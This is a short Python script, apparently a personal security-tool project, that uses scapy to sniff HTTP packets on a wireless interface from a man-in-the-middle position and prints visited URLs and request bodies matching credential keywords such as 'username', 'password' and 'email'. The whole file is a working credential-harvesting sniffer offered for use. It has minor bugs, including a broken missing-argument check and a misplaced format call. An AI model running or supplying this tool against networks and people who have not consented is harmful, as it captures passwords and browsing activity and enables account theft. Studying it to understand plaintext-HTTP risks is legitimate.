#!/usr/bin/env python

# Author: Matthew Zito (goldmund) 
# Contact: https://www.github.com/MatthewZito
# Version: 0.1.0

"""
Presumes controller is MITM. Given a user input
wireless device, this program will sniff HTTP traffic
and output URLs and possible user credentials.
"""
import scapy.all as scapy
from scapy.layers import http
import argparse
import chalk

def elicit_arguments():
    """
    Fetches argument wireless interface from user.
    """
    parser = argparse.ArgumentParser(description="Sniff HTTP packets on a given wireless interface.")
    parser.add_argument("-i","--interface", dest="interface", help="name of wireless interface to sniff on")
    args = parser.parse_args() 
    if (not args):
        parser.error("[-] Wireless interface not specified. Use --help for usage instructions." )
    return args

def get_url(packet):
    """
    Pulls and returns all URLs from HTTP given packets.
    """
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_credentials(packet):
    """
    Pulls and returns all prospective user credentials
    from given HTTP packets.
    """
    if (packet.haslayer(scapy.Raw)):
            load = packet[scapy.Raw].load
            keywords = ["username", "user", "password", "pass", "login", "signup", "email", "credential", "name"]
            for keyword in keywords:
                if keyword in load:
                    return load

def process_packet(packet):
    if (packet.haslayer(http.HTTPRequest)): 
        url = get_url(packet)
        print(chalk.blue("[+] HTTP Request"))
        print(url + "\n")
        credentials = get_credentials(packet)
        if (credentials):
            print(chalk.green("\n[+] Prospective credentials found"))
            print(credentials + "\n")
        

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)


def main():
    user_args = elicit_arguments()
    print(chalk.green("[+] Packet sniffing initiated...\n"))
    sniff(user_args.interface)

if __name__ == "__main__":
    try:
        main()
    except Exception as stderr:
        print(chalk.red("\n[x] Program terminated. See: {i}")).format(i=stderr)
    